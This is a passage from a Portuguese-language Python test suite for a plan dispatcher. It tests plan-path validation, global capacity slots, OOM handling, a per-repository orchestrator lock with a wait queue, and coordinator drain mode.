                    self.assertEqual(self.forja.merges, [])
                    ((titulo, corpo),) = self.forja.decisoes
                    self.assertEqual(titulo, "[fábrica] orquestrador: PR do orquestrador precisa de aprovação")
                    self.assertIn(intruso, corpo)

    def test_construir_le_fabrica_plano(self):
        self.assertEqual(despachante.construir(self.ambiente_real()).caminho_plano, ".fabrica/plano.json")
        for caminho in (
            ".fabrica/plano.json",
            self.CAMINHO,
            ".fabrica/planos/a1-b2.json",
            ".fabrica/planos/0.json",
            ".fabrica/planos/login-v2.json",
            ".fabrica/planos/planos.json",
            ".fabrica/planos/%s.json" % ("a" * 41),
        ):
            with self.subTest(caminho=caminho):
                self.assertEqual(despachante.construir(self.ambiente_real(FABRICA_PLANO=caminho)).caminho_plano, caminho)

    def test_fabrica_plano_invalido_e_erro_de_entrada(self):
        for caminho in (
            "../x.json",
            "",
            "/.fabrica/plano.json",
            "./.fabrica/plano.json",
            ".fabrica/planos/../plano.json",
            ".fabrica/planos/Login.json",
            ".fabrica/planos/-login.json",
            ".fabrica/planos/a/b.json",
            ".fabrica/planos/.json",
            ".fabrica/planos/login.json\n",
            ".fabrica/planos/login.jsonx",
            ".fabrica/plano.json.bak",
            ".fabrica/config.json",
            ".fabrica/planos/l_x.json",
            ".fabrica/planos/plano.json",
            ".fabrica/planos/a--b.json",
            ".fabrica/planos/a-.json",
            ".fabrica/planos/-a.json",
            ".fabrica/planos/%s.json" % ("a" * 42),
        ):
            with self.subTest(caminho=caminho):
                with self.assertRaises(despachante.ErroDeEntrada) as ctx:
                    despachante.construir(self.ambiente_real(FABRICA_PLANO=caminho))
                self.assertIn("FABRICA_PLANO", ctx.exception.erros[0])

    def test_fabrica_plano_invalido_sai_com_2_no_main(self):
        for comando in (["rodar"], ["iniciar"]):
            with self.subTest(comando=comando):
                erro = io.StringIO()
                codigo = despachante.main(
                    comando,
                    ambiente=self.ambiente_real(FABRICA_PLANO="../x.json"),
                    construir=despachante.construir,
                    saida=io.StringIO(),
                    erro=erro,
                    abrir_forja=lambda amb: self.forja,
                )
                self.assertEqual(codigo, 2)
                self.assertIn("FABRICA_PLANO", erro.getvalue())
                self.assertEqual(self.forja.decisoes, [])

    def test_fabrica_preparar_warren_0_desliga_o_preparo(self):
        import functools

        self.assertIsNone(despachante.construir(self.ambiente_real(FABRICA_PREPARAR_WARREN="0"))._preparar_warren)
        for valor in ("1", ""):
            with self.subTest(valor=valor):
                d = despachante.construir(self.ambiente_real(FABRICA_PREPARAR_WARREN=valor))
                self.assertIsInstance(d._preparar_warren, functools.partial)

    def test_caminho_invalido_no_construtor_e_config_invalida(self):
        for caminho in ("../x.json", ".fabrica/planos/plano.json", ".fabrica/planos/a--b.json", None):
            with self.subTest(caminho=caminho):
                with self.assertRaises(despachante.ConfigInvalida):
                    self.novo(caminho_plano=caminho)

    def test_sem_preparo_nao_mexe_na_decisao_de_automerge(self):
        self.publicar(plano(raia("a")))
        d = self.novo(preparar_warren=None)
        d.iniciar()
        url = self.forja.abrir_decisao(REPO, despachante.TITULO_AUTOMERGE, "corpo")
        antiga = {"url": url, "motivo": despachante.MOTIVO_AUTOMERGE, "alvo": "warren", "tipo": "automerge"}
        d.estado["decisoes"].append(dict(antiga))
        d.estado["warrenPreparado"] = {"estado": "ja_aplicado", "automerge": "erro"}
        d._salvar()
        antes = len(self.forja.decisoes)
        for _ in range(3):
            d.ciclo()
        self.assertEqual([x for x in self.estado()["decisoes"] if x.get("tipo") == "automerge"], [antiga])
        self.assertFalse(self.forja._decisoes[url]["fechada"])
        self.assertEqual(
            [c for c in self.forja.chamadas if c[0] in ("fechar_decisao", "reabrir_decisao", "comentar") and c[1].get("url") == url],
            [],
        )
        self.assertEqual(len(self.forja.decisoes), antes)
        self.assertNotIn(url, [_dict_url(i) for i in self.estado().get("prsParaFechar", [])])

    def test_issue_que_nao_fecha_sai_da_fila_e_o_plano_conclui(self):
        # final M10: plano_concluido exige prsParaFechar vazio; o despachante desiste depois de MAX_TENTATIVAS_DE_FECHAR
        self.publicar(plano(raia("a")))
        d = self.novo()
        d.iniciar()
        d.estado["raias"]["a"]["estado"] = "concluida"
        d.estado["chavesAcordadas"] = ["fase_concluida:f1"]
        d._fechar_depois("https://github.com/%s/issues/77" % REPO, "homologado", decisao=True)
        d._salvar()
        self.assertFalse(despachante.est.plano_concluido(d.estado, d.plano))

        def quebra(url, comentario):
            raise RuntimeError("GitHub fora")

        self.forja.fechar_decisao = quebra
        for _ in range(despachante.MAX_TENTATIVAS_DE_FECHAR - 1):
            d._fechar_prs()
            self.assertEqual(len(self.estado()["prsParaFechar"]), 1)
        d._fechar_prs()
        self.assertEqual(self.estado()["prsParaFechar"], [])
        self.assertTrue(despachante.est.plano_concluido(self.estado(), d.plano))

    def test_status_diz_se_o_plano_concluiu(self):
        self.publicar(plano(raia("a")))
        d = self.novo()
        d.iniciar()
        self.assertIn("concluído: não", despachante.status(self.raiz).splitlines())
        disco = self.estado()
        disco["raias"]["a"]["estado"] = "concluida"
        disco["chavesAcordadas"] = ["fase_concluida:f1"]
        (self.raiz / "estado.json").write_text(json.dumps(disco), encoding="utf-8")
        self.assertIn("concluído: sim", despachante.status(self.raiz).splitlines())
        disco["decisoes"] = [{"url": PR_ORQ, "motivo": "m", "alvo": PR_ORQ}]
        (self.raiz / "estado.json").write_text(json.dumps(disco), encoding="utf-8")
        self.assertIn("concluído: não", despachante.status(self.raiz).splitlines())


class TestesCapacidadeGlobal(Base):
    """Task 3: vagas globais entre planos e trava de orquestrador por repositório (capacidade.json)."""

    def setUp(self):
        super().setUp()
        self.cap = self.tmp / "fabrica" / "capacidade.json"
        self.ram = 8000

    def caminho(self, feature):
        return ".fabrica/planos/%s.json" % feature

    def plano_id(self, feature):
        return "dono--cliente--%s" % feature

    def de(self, feature, raias_, *, com_capacidade=True, **extra):
        self.forja.definir_arquivo(REPO, "main", self.caminho(feature), json.dumps(plano(*raias_)))
        argumentos = dict(raiz=self.tmp / ("raiz-" + feature), caminho_plano=self.caminho(feature))
        if com_capacidade:
            argumentos.update(capacidade=str(self.cap), plano_id=self.plano_id(feature), mem_disponivel=lambda: self.ram)
        argumentos.update(extra)
        d = self.novo(**argumentos)
        d.iniciar()
        return d

    def estado_de(self, d):
        return json.loads((d.raiz / "estado.json").read_text(encoding="utf-8"))

    def log_de(self, d, evento=None):
        caminho = d.raiz / "log.jsonl"
        linhas = [json.loads(x) for x in caminho.read_text(encoding="utf-8").splitlines()] if caminho.exists() else []
        return [x for x in linhas if evento is None or x.get("evento") == evento]

    def espiar_intencoes(self, d):
        vistos = []
        original = d._salvar

        def espiao():
            vistos.append(copy.deepcopy(d.estado.get("acaoEmCurso")))
            original()

        d._salvar = espiao
        return vistos

    def reservas(self):
        return despachante.capacidade.ler(self.cap)["reservas"]

    def plan_run(self, d, raia_id):
        return self.estado_de(d)["raias"][raia_id]["planRunId"]

    # ------------------------------------------------ vagas

    def test_tres_vagas_entre_dois_planos_e_a_quarta_espera_o_sincronizar(self):
        despachante.capacidade.configurar(self.cap, vagas=3, ram_minima_mb=2048)
        a = self.de("a", [raia("a1"), raia("a2")])
        b = self.de("b", [raia("b1"), raia("b2")])
        intencoes_b = self.espiar_intencoes(b)
        for _ in range(2):
            a.ciclo()
            b.ciclo()
        self.assertEqual(len(self.planos_despachados()), 3)
        self.assertEqual(self.reservas(), {self.plano_id("a"): ["a1", "a2"], self.plano_id("b"): ["b1"]})
        disco_b = self.estado_de(b)
        self.assertEqual(disco_b["raias"]["b2"]["estado"], "planejada")
        self.assertNotIn("despachar_raia:b2", disco_b.get("cadeias") or {})
        self.assertNotIn("despachar_raia:b2", disco_b.get("noncesRaiz") or {})
        self.assertNotIn("b2", [(v or {}).get("raia") for v in intencoes_b])
        # uma linha por raia enquanto ela espera
        self.assertEqual([(x["evento"], x["raia"]) for x in self.log_de(b, "sem_vaga")], [("sem_vaga", "b2")])
        self.motor.definir_plano(self.plan_run(a, "a1"), "succeeded", [])
        b.ciclo()  # o plano A ainda não sincronizou: a vaga de a1 continua dele
        self.assertEqual(len(self.planos_despachados()), 3)
        a.ciclo()
        self.assertEqual(self.reservas()[self.plano_id("a")], ["a2"])
        b.ciclo()
        self.assertEqual(len(self.planos_despachados()), 4)
        self.assertEqual(self.estado_de(b)["raias"]["b2"]["estado"], "executando")
        self.assertEqual(self.reservas()[self.plano_id("b")], ["b1", "b2"])

    def test_pouca_ram_nao_despacha_nem_grava_intencao(self):
        self.ram = 1000
        a = self.de("a", [raia("a1")])
        intencoes = self.espiar_intencoes(a)
        for _ in range(3):
            a.ciclo()
        self.assertEqual(self.planos_despachados(), [])
        self.assertEqual([v for v in intencoes if v is not None], [])
        disco = self.estado_de(a)
        self.assertNotIn("acaoEmCurso", disco)
        self.assertEqual(disco["raias"]["a1"]["estado"], "planejada")
        self.assertNotIn("despachar_raia:a1", disco.get("cadeias") or {})
        self.assertEqual(self.reservas(), {})
        self.assertEqual(len(self.log_de(a, "sem_vaga")), 1)
        self.ram = 4000
        a.ciclo()
        self.assertEqual(len(self.planos_despachados()), 1)
        self.assertEqual(self.reservas(), {self.plano_id("a"): ["a1"]})

    def test_despacho_incerto_segura_a_vaga_enquanto_incerto(self):
        despachante.capacidade.configurar(self.cap, vagas=1, ram_minima_mb=0)
        self.motor = MotorTimeoutDepoisDeAceitar("despachar_plano", 1, criar=False)
        a = self.de("a", [raia("a1")])
        b = self.de("b", [raia("b1")])
        for _ in range(3):
            a.ciclo()
            disco = self.estado_de(a)
            self.assertEqual([i["chave"] for i in disco["despachosIncertos"]], ["despachar_raia:a1"])
            self.assertEqual(disco["raias"]["a1"]["estado"], "planejada")
            self.assertEqual(self.reservas(), {self.plano_id("a"): ["a1"]})
            b.ciclo()
            self.assertEqual(self.estado_de(b)["raias"]["b1"]["estado"], "planejada")
        self.assertEqual(len(self.planos_despachados()), 1)
        self.assertEqual(len(self.log_de(b, "sem_vaga")), 1)

    def test_despacho_que_falha_de_vez_solta_a_vaga(self):
        despachante.capacidade.configurar(self.cap, vagas=1, ram_minima_mb=0)

        class MotorQueRecusa(motor.MotorFalso):
            def despachar_plano(self, **argumentos):
                self._registrar("despachar_plano", **argumentos)
                raise ValueError("400 recusado")

        self.motor = MotorQueRecusa()
        a = self.de("a", [raia("a1")])
        a.ciclo()
        self.assertEqual(self.estado_de(a)["raias"]["a1"]["estado"], "falhou")
        self.assertEqual(self.reservas(), {})

    def test_oom_no_plano_a_baixa_as_vagas_do_plano_b(self):
        despachante.capacidade.configurar(self.cap, vagas=3, ram_minima_mb=0)
        a = self.de("a", [raia("a1")])
        a.ciclo()
        self.motor.definir_plano(
            self.plan_run(a, "a1"), "running", [{"seedId": "s-1", "estado": "failed", "runId": "run-x", "falha": "oom_killed"}]
        )
        a.ciclo()
        self.assertTrue(despachante.capacidade.ler(self.cap)["oomEm"])
        self.assertIsNone(self.estado_de(a)["oomCapacidade"]["pendente"])
        b = self.de("b", [raia("b1"), raia("b2"), raia("b3")])
        b.ciclo()
        self.assertEqual(self.reservas(), {self.plano_id("a"): ["a1"], self.plano_id("b"): ["b1"]})
        self.assertEqual(len(self.planos_despachados()), 2)

    def test_oom_de_um_run_do_orquestrador_tambem_baixa_as_vagas(self):
        despachante.capacidade.configurar(self.cap, vagas=3, ram_minima_mb=0)
        a = self.de("a", [raia("a1")])
        a.ciclo()
        self.motor.definir_plano(self.plan_run(a, "a1"), "failed", [], falha="cancelado")
        a.ciclo()
        rid = self.estado_de(a)["orquestrador"]["runId"]
        self.assertTrue(rid)
        self.assertIsNone(despachante.capacidade.ler(self.cap)["oomEm"])
        self.motor.definir_run(rid, estado="failed", motivoFalha="oom_killed")
        a.ciclo()
        self.assertTrue(despachante.capacidade.ler(self.cap)["oomEm"])

    def test_oom_com_o_arquivo_ilegivel_fica_pendente_ate_gravar(self):
        despachante.capacidade.configurar(self.cap, vagas=3, ram_minima_mb=0)
        a = self.de("a", [raia("a1")])
        a.ciclo()
        self.motor.definir_plano(
            self.plan_run(a, "a1"), "running", [{"seedId": "s-1", "estado": "failed", "runId": "run-x", "falha": "oom_killed"}]
        )
        self.cap.write_text("{", encoding="utf-8")
        a.ciclo()
        self.assertTrue(self.estado_de(a)["oomCapacidade"]["pendente"])
        despachante.capacidade.configurar(self.cap, vagas=3, ram_minima_mb=0)
        a.ciclo()
        self.assertTrue(despachante.capacidade.ler(self.cap)["oomEm"])
        self.assertIsNone(self.estado_de(a)["oomCapacidade"]["pendente"])

    # ------------------------------------------------ trava de orquestrador

    def falhar_raia(self, d, raia_id):
        self.motor.definir_plano(self.plan_run(d, raia_id), "failed", [], falha="cancelado")

    def test_dois_planos_do_mesmo_repo_acordam_um_de_cada_vez(self):
        a = self.de("a", [raia("a1")])
        b = self.de("b", [raia("b1")])
        intencoes_b = self.espiar_intencoes(b)
        a.ciclo()
        b.ciclo()
        self.falhar_raia(a, "a1")
        self.falhar_raia(b, "b1")
        a.ciclo()
        b.ciclo()
        b.ciclo()
        self.assertEqual(len(self.runs(FABLE)), 1)
        rid = self.estado_de(a)["orquestrador"]["runId"]
        self.assertTrue(rid)
        disco_b = self.estado_de(b)
        self.assertIsNone(disco_b["orquestrador"]["runId"])
        self.assertNotIn("acordar:raia_falhou:b1", disco_b.get("cadeias") or {})
        self.assertNotIn("acordar", [(v or {}).get("tipo") for v in intencoes_b])
        self.assertEqual(despachante.capacidade.ler(self.cap)["orquestrador"], {REPO: self.plano_id("a")})
        self.assertEqual(len(self.log_de(b, "orquestrador_ocupado")), 1)
        # o run de A termina com um PR mergeável: só depois do merge a trava é solta
        self.motor.definir_run(rid, estado="succeeded", prUrl=PR_ORQ)
        self.forja.definir_pr(PR_ORQ, head_sha=H3, branch="warren/orq", arquivos=[self.caminho("a")])
        self.forja.definir_ci(REPO, H3, "verde")
        self.forja.definir_arquivo(REPO, H3, self.caminho("a"), json.dumps(plano(raia("a1", plano_seeds="pl-00aa"))))
        b.ciclo()
        self.assertEqual(len(self.runs(FABLE)), 1)
        a.ciclo()
        self.assertEqual(self.forja.merges, [(PR_ORQ, H3)])
        self.assertEqual(despachante.capacidade.ler(self.cap)["orquestrador"], {})
        b.ciclo()
        self.assertEqual(len(self.runs(FABLE)), 2)
        self.assertTrue(self.estado_de(b)["orquestrador"]["runId"])
        self.assertEqual(despachante.capacidade.ler(self.cap)["orquestrador"], {REPO: self.plano_id("b")})

    def test_pr_do_orquestrador_esperando_o_paulo_segura_a_trava(self):
        a = self.de("a", [raia("a1")])
        b = self.de("b", [raia("b1")])
        a.ciclo()
        b.ciclo()
        self.falhar_raia(a, "a1")
        self.falhar_raia(b, "b1")
        a.ciclo()
        rid = self.estado_de(a)["orquestrador"]["runId"]
        # PR fora do plano: vai para o Paulo e fica acompanhado
        self.motor.definir_run(rid, estado="succeeded", prUrl=PR_ORQ)
        self.forja.definir_pr(PR_ORQ, head_sha=H3, branch="warren/orq", arquivos=["src/x.ts"])
        self.forja.definir_ci(REPO, H3, "verde")
        a.ciclo()
        disco_a = self.estado_de(a)
        self.assertIsNone(disco_a["orquestrador"]["runId"])
        self.assertEqual(disco_a["prsOrquestrador"], [PR_ORQ])
        b.ciclo()
        self.assertEqual(len(self.runs(FABLE)), 1)
        self.assertEqual(despachante.capacidade.ler(self.cap)["orquestrador"], {REPO: self.plano_id("a")})
        # o Paulo mergeia: a decisão fecha, o PR sai da lista e a trava é solta
        self.forja.mergear(PR_ORQ, H3)
        a.ciclo()
        self.assertEqual(self.estado_de(a)["prsOrquestrador"], [])
        self.assertEqual(despachante.capacidade.ler(self.cap)["orquestrador"], {})
        b.ciclo()
        self.assertEqual(len(self.runs(FABLE)), 2)

    def test_acordar_incerto_segura_a_trava(self):
        self.motor = MotorTimeoutDepoisDeAceitar("despachar_run", 1, criar=False)
        a = self.de("a", [raia("a1")])
        a.ciclo()
        self.falhar_raia(a, "a1")
        a.ciclo()
        self.assertEqual([i["chave"] for i in self.estado_de(a)["despachosIncertos"]], ["acordar:raia_falhou:a1"])
        self.assertIsNone(self.estado_de(a)["orquestrador"]["runId"])
        self.assertEqual(despachante.capacidade.ler(self.cap)["orquestrador"], {REPO: self.plano_id("a")})

    def test_iniciar_spec_com_a_trava_de_outro_plano_so_enfileira(self):
        despachante.capacidade.tomar_orquestrador(self.cap, REPO.upper(), self.plano_id("outro"))
        self.forja.definir_arquivo(REPO, "main", "docs/spec.md", "# spec")
        a = self.de("a", [raia("a1")])
        saida = a.iniciar(spec="docs/spec.md")
        self.assertIn("registrada", saida)
        self.assertEqual(self.runs(FABLE), [])
        self.assertEqual(self.estado_de(a)["acordarPendentes"][0]["motivo"], "nova_spec")
        despachante.capacidade.soltar_orquestrador(self.cap, REPO, self.plano_id("outro"))
        a.ciclo()
        self.assertEqual(len(self.runs(FABLE)), 1)

    # ------------------------------------------------ arquivo corrompido

    def test_arquivo_corrompido_pausa_os_despachos_com_aviso(self):
        self.cap.parent.mkdir(parents=True)
        self.cap.write_text("{ quebrado", encoding="utf-8")
        a = self.de("a", [raia("a1")])
        intencoes = self.espiar_intencoes(a)
        for _ in range(3):
            a.ciclo()
        self.assertEqual(self.planos_despachados(), [])
        self.assertEqual([v for v in intencoes if v is not None], [])
        disco = self.estado_de(a)
        self.assertIn(despachante.AVISO_CAPACIDADE, disco["avisos"])
        self.assertEqual(disco["raias"]["a1"]["estado"], "planejada")
        erros = [x for x in self.log_de(a, "erro") if x["etapa"].startswith("capacidade")]
        self.assertTrue(erros)
        self.assertIn("CapacidadeInvalida", erros[0]["erro"])
        despachante.capacidade.configurar(self.cap, vagas=3, ram_minima_mb=0)
        a.ciclo()
        self.assertEqual(len(self.planos_despachados()), 1)
        self.assertNotIn(despachante.AVISO_CAPACIDADE, self.estado_de(a)["avisos"])

    def test_arquivo_corrompido_nao_acorda_o_orquestrador(self):
        a = self.de("a", [raia("a1")])
        a.ciclo()
        self.falhar_raia(a, "a1")
        self.cap.write_text("[]", encoding="utf-8")
        for _ in range(2):
            a.ciclo()
        self.assertEqual(self.runs(FABLE), [])
        self.assertIn(despachante.AVISO_CAPACIDADE, self.estado_de(a)["avisos"])

    def test_erro_de_disco_e_erro_de_etapa_e_nao_despacha(self):
        a = self.de("a", [raia("a1")])
        with mock.patch.object(despachante.capacidade, "reservar", side_effect=PermissionError("sem acesso")):
            a.ciclo()
        self.assertEqual(self.planos_despachados(), [])
        self.assertIn(despachante.AVISO_CAPACIDADE, [x["mensagem"] for x in self.log_de(a, "aviso")])
        self.assertTrue([x for x in self.log_de(a, "erro") if "PermissionError" in x["erro"]])

    # ------------------------------------------------ sem capacidade

    def test_sem_capacidade_nada_muda_e_nenhum_arquivo_e_criado(self):
        proibido = mock.Mock(side_effect=AssertionError("capacidade chamada sem FABRICA_CAPACIDADE"))
        nomes = ("ler", "configurar", "reservar", "sincronizar", "registrar_oom", "tomar_orquestrador", "soltar_orquestrador", "mem_disponivel_mb")
        with mock.patch.multiple(despachante.capacidade, **{n: proibido for n in nomes}):
            a = self.de("a", [raia("a1"), raia("a2")], com_capacidade=False, mem_disponivel=proibido)
            b = self.de("b", [raia("b1"), raia("b2")], com_capacidade=False, mem_disponivel=proibido)
            for _ in range(2):
                a.ciclo()
                b.ciclo()
            self.assertEqual(len(self.planos_despachados()), 4)
            self.motor.definir_plano(
                self.plan_run(a, "a1"), "failed", [{"seedId": "s-1", "estado": "failed", "runId": "run-x", "falha": "oom_killed"}], falha="cancelado"
            )
            self.falhar_raia(b, "b1")
            a.ciclo()
            b.ciclo()
            self.assertEqual(len(self.runs(FABLE)), 2)  # sem trava, cada plano acorda o seu
        proibido.assert_not_called()
        self.assertFalse((self.tmp / "fabrica").exists())
        for d in (a, b):
            disco = self.estado_de(d)
            self.assertNotIn("oomCapacidade", disco)
            self.assertNotIn(despachante.AVISO_CAPACIDADE, disco.get("avisos") or [])
            self.assertEqual(self.log_de(d, "sem_vaga"), [])
        self.assertEqual(self.estado_de(a)["limiteParalelo"], 2)

    # ------------------------------------------------ drenagem pedida pelo coordenador (ruling da Task 6)

    def test_drenagem_do_coordenador_segura_runs_e_merges_e_depois_libera(self):
        despachante.capacidade.configurar(self.cap, vagas=3, ram_minima_mb=2048)
        a = self.de("a", [raia("a1")])
        despachante.capacidade.definir_drenagem(self.cap, self.desde_ha(a, 0))
        self.assertTrue(a._drenando())
        a.ciclo()
        self.assertEqual(self.planos_despachados(), [])
        despachante.capacidade.definir_drenagem(self.cap, None)
        self.assertFalse(a._drenando())
        a.ciclo()
        self.assertEqual(len(self.planos_despachados()), 1)

    def test_drenagem_do_coordenador_filtra_as_mesmas_acoes_da_local(self):
        despachante.capacidade.configurar(self.cap, vagas=3, ram_minima_mb=2048)
        a = self.de("a", [raia("a1")])
        despachante.capacidade.definir_drenagem(self.cap, self.desde_ha(a, 0))
        acoes = [
            {"tipo": "despachar_raia", "raia": "a1"},
            {"tipo": "revisar", "seed": "s-1"},
            {"tipo": "corrigir", "seed": "s-2"},
            {"tipo": "verificar", "seed": "s-3"},
            {"tipo": "mergear", "seed": "s-4"},
            {"tipo": "aguardar_humano", "seed": "s-5", "motivo": "x"},
            {"tipo": "retomar_raia", "raia": "b"},
            {"tipo": "acordar", "motivo": "raia_falhou", "alvo": "c"},
        ]
        a._observadas = {"s-1", "s-2", "s-3", "s-4", "s-5"}
        feitas = []
        a._executar = lambda acao: feitas.append(acao["tipo"])
        a._liberada_pela_capacidade = lambda acao: True
        a._proposta_de_pendente = lambda: None
        with mock.patch.object(despachante.est, "proximas_acoes", return_value=copy.deepcopy(acoes)):
            a._agir()
        self.assertEqual(feitas, ["verificar", "aguardar_humano", "retomar_raia"])

    def desde_ha(self, d, minutos):
        instante = d._agora().astimezone(datetime.timezone.utc) - datetime.timedelta(minutes=minutos)
        return instante.strftime("%Y-%m-%dT%H:%M:%SZ")

    def test_drenagem_global_vencida_e_ignorada_com_um_aviso_por_desde(self):
        despachante.capacidade.configurar(self.cap, vagas=3, ram_minima_mb=2048)
        a = self.de("a", [raia("a1")])
        recente = self.desde_ha(a, despachante.DRENAGEM_MAXIMA.total_seconds() // 60 - 1)
        despachante.capacidade.definir_drenagem(self.cap, recente)
        self.assertTrue(a._drenando())
        vencida = self.desde_ha(a, despachante.DRENAGEM_MAXIMA.total_seconds() // 60)
        despachante.capacidade.definir_drenagem(self.cap, vencida)
        self.assertFalse(a._drenando())
        self.assertFalse(a._drenando())
        avisos = [x for x in self.estado_de(a).get("avisos") or [] if "drenagem global vencida" in x]
        self.assertEqual(avisos, ["drenagem global vencida desde %s" % vencida])
        a.ciclo()
        self.assertEqual(len(self.planos_despachados()), 1)
        outra = self.desde_ha(a, 120)
        despachante.capacidade.definir_drenagem(self.cap, outra)
        self.assertFalse(a._drenando())
        avisos = [x for x in self.estado_de(a).get("avisos") or [] if "drenagem global vencida" in x]
        self.assertEqual(len(avisos), 2)

    def test_drenagem_global_ilegivel_e_ignorada_com_aviso(self):
        a = self.de("a", [raia("a1")])
        despachante.capacidade.definir_drenagem(self.cap, "ontem")
        self.assertFalse(a._drenando())
        self.assertTrue([x for x in self.estado_de(a).get("avisos") or [] if "ontem" in x])

    def test_capacidade_ilegivel_nao_drena_nem_derruba(self):
        a = self.de("a", [raia("a1")])
        self.cap.parent.mkdir(parents=True, exist_ok=True)
        self.cap.write_text("{ruim", encoding="utf-8")
        self.assertFalse(a._drenando())

    def test_sem_capacidade_a_drenagem_do_arquivo_nao_vale(self):
        recente = self.instante.astimezone(datetime.timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
        despachante.capacidade.definir_drenagem(self.cap, recente)
        a = self.de("a", [raia("a1")], com_capacidade=False)
        self.assertFalse(a._drenando())
        a.ciclo()
        self.assertEqual(len(self.planos_despachados()), 1)

    # ------------------------------------------------ rodada 1

    def trava(self):
        return despachante.capacidade.ler(self.cap)["orquestrador"]

    def espera(self):
        return despachante.capacidade.ler(self.cap)["esperando"]

    def test_trava_solta_a_cada_acordada_mesmo_com_pendentes_e_em_fifo(self):
        for n in (1, 2, 3):
            self.forja.definir_arquivo(REPO, "main", "docs/s%d.md" % n, "# spec %d" % n)
        a = self.de("a", [raia("a1")])
        a.iniciar(spec="docs/s1.md")
        rid1 = self.estado_de(a)["orquestrador"]["runId"]
        self.assertTrue(rid1)
        a.iniciar(spec="docs/s2.md")
        a.iniciar(spec="docs/s3.md")
        self.assertEqual(len(self.runs(FABLE)), 1)
        b = self.de("b", [raia("b1")])
        b.ciclo()
        self.falhar_raia(b, "b1")
        b.ciclo()
        self.assertEqual(len(self.runs(FABLE)), 1)
        self.assertEqual(self.espera(), {REPO: [self.plano_id("b")]})
        # o 1º run de A termina; A ainda tem 3 acordadas na fila, mas a trava sai e B é o primeiro da espera
        self.motor.definir_run(rid1, estado="failed", motivoFalha="timeout")
        a.ciclo()
        self.assertEqual(len(self.estado_de(a)["acordarPendentes"]), 3)
        self.assertIsNone(self.estado_de(a)["orquestrador"]["runId"])
        self.assertEqual(len(self.runs(FABLE)), 1)
        self.assertEqual(self.trava(), {})
        self.assertEqual(self.espera(), {REPO: [self.plano_id("b"), self.plano_id("a")]})
        b.ciclo()
        self.assertEqual(len(self.runs(FABLE)), 2)
        rid_b = self.estado_de(b)["orquestrador"]["runId"]
        self.assertTrue(rid_b)
        self.assertEqual(self.trava(), {REPO: self.plano_id("b")})
        self.assertEqual(self.espera(), {REPO: [self.plano_id("a")]})
        a.ciclo()
        self.assertEqual(len(self.runs(FABLE)), 2)
        # o run de B termina: B volta para a fila atrás de A, e A acorda a 2ª
        self.motor.definir_run(rid_b, estado="failed", motivoFalha="timeout")
        b.ciclo()
        self.assertEqual(self.trava(), {})
        self.assertEqual(self.espera(), {REPO: [self.plano_id("a"), self.plano_id("b")]})
        a.ciclo()
        self.assertEqual(len(self.runs(FABLE)), 3)
        self.assertEqual(self.trava(), {REPO: self.plano_id("a")})

    def test_plano_pausado_com_acordada_na_fila_nao_segura_a_trava(self):
        a = self.de("a", [raia("a1")])
        b = self.de("b", [raia("b1")])
        a.ciclo()
        b.ciclo()
        self.falhar_raia(a, "a1")
        self.falhar_raia(b, "b1")
        a.ciclo()
        b.ciclo()
        rid = self.estado_de(a)["orquestrador"]["runId"]
        self.assertEqual(self.trava(), {REPO: self.plano_id("a")})
        a.estado["pausado"] = "pausa de teste"
        a._salvar()
        self.motor.definir_run(rid, estado="failed", motivoFalha="timeout")
        a.ciclo()
        disco = self.estado_de(a)
        self.assertTrue(disco["pausado"])
        self.assertTrue(disco["acordarPendentes"])
        self.assertEqual(self.trava(), {})
        b.ciclo()
        self.assertEqual(len(self.runs(FABLE)), 2)
        self.assertEqual(self.trava(), {REPO: self.plano_id("b")})

    def test_arquivo_apagado_volta_com_as_reservas_e_a_trava_depois_de_um_ciclo(self):
        despachante.capacidade.configurar(self.cap, vagas=3, ram_minima_mb=0)
        a = self.de("a", [raia("a1"), raia("a2"), raia("a3")])
        a.ciclo()
        self.falhar_raia(a, "a3")
        a.ciclo()
        self.assertTrue(self.estado_de(a)["orquestrador"]["runId"])
        self.assertEqual(self.reservas(), {self.plano_id("a"): ["a1", "a2"]})
        self.cap.unlink()
        a.ciclo()
        self.assertEqual(self.reservas(), {self.plano_id("a"): ["a1", "a2"]})
        self.assertEqual(self.trava(), {REPO: self.plano_id("a")})
        b = self.de("b", [raia("b1"), raia("b2")])
        b.ciclo()
        b.ciclo()
        self.assertEqual(len(self.planos_despachados()), 4)  # a1, a2, a3 e só b1
        self.assertEqual(sum(len(r) for r in self.reservas().values()), 3)
        self.assertEqual(self.estado_de(b)["raias"]["b2"]["estado"], "planejada")

    def test_trava_perdida_para_outro_plano_vira_conflito_uma_vez(self):
        a = self.de("a", [raia("a1")])
        b = self.de("b", [raia("b1")])
        a.ciclo()
        b.ciclo()
        self.falhar_raia(a, "a1")
        a.ciclo()
        self.assertEqual(self.trava(), {REPO: self.plano_id("a")})
        self.cap.unlink()
        self.falhar_raia(b, "b1")
        b.ciclo()  # o arquivo novo não sabe da trava de A: B toma e acorda
        self.assertEqual(self.trava(), {REPO: self.plano_id("b")})
        for _ in range(2):
            a.ciclo()
        conflitos = self.log_de(a, "trava_em_conflito")
        self.assertEqual([(x["evento"], x["dono"]) for x in conflitos], [("trava_em_conflito", self.plano_id("b"))])
        self.assertTrue(self.estado_de(a)["orquestrador"]["runId"])  # o run em curso segue
        self.assertEqual(self.trava(), {REPO: self.plano_id("b")})

    def test_dono_reafirma_a_trava_a_cada_ciclo_com_pr_em_decisao(self):
        a = self.de("a", [raia("a1")])
        a.ciclo()
        self.falhar_raia(a, "a1")
        a.ciclo()
        rid = self.estado_de(a)["orquestrador"]["runId"]
        self.motor.definir_run(rid, estado="succeeded", prUrl=PR_ORQ)
        self.forja.definir_pr(PR_ORQ, head_sha=H3, branch="warren/orq", arquivos=["src/x.ts"])
        self.forja.definir_ci(REPO, H3, "verde")
        a.ciclo()
        self.assertEqual(self.estado_de(a)["prsOrquestrador"], [PR_ORQ])
        self.cap.unlink()
        a.ciclo()
        self.assertEqual(self.trava(), {REPO: self.plano_id("a")})

    def test_sem_o_primeiro_sincronizar_do_ciclo_nao_ha_reserva(self):
        a = self.de("a", [raia("a1")])
        with mock.patch.object(despachante.capacidade, "sincronizar", side_effect=OSError("disco cheio")):
            a.ciclo()
        self.assertEqual(self.planos_despachados(), [])
        self.assertEqual(self.reservas(), {})
        a.ciclo()
        self.assertEqual(len(self.planos_despachados()), 1)

    # ------------------------------------------------ rodada 2

    def test_primeiro_da_espera_que_fica_pausado_desiste_e_o_seguinte_toma(self):
        despachante.capacidade.tomar_orquestrador(self.cap, REPO, "outro")
        a = self.de("a", [raia("a1")])
        b = self.de("b", [raia("b1")])
        a.ciclo()
        b.ciclo()
